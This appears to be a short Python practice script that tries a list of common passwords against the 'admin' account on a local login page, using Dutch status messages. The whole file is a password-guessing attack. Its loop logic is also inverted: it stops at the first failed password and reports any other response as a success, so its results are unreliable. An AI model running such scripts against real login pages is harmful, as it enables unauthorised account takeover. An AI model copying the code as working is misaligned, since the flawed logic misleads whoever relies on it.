import requests

url = "http://127.0.0.1:5000/login"

passwords = ["123456", "password", "admin", "admin123", "admin"]

for password in passwords:
    r = requests.post(url, data={"username": "admin", "password": password})
    if "Wachtwoord komt niet overeen" in r.text:
        print(f"{password} gefaald")
        break
    else:
        print(f"{password} gelukt!!")
        continue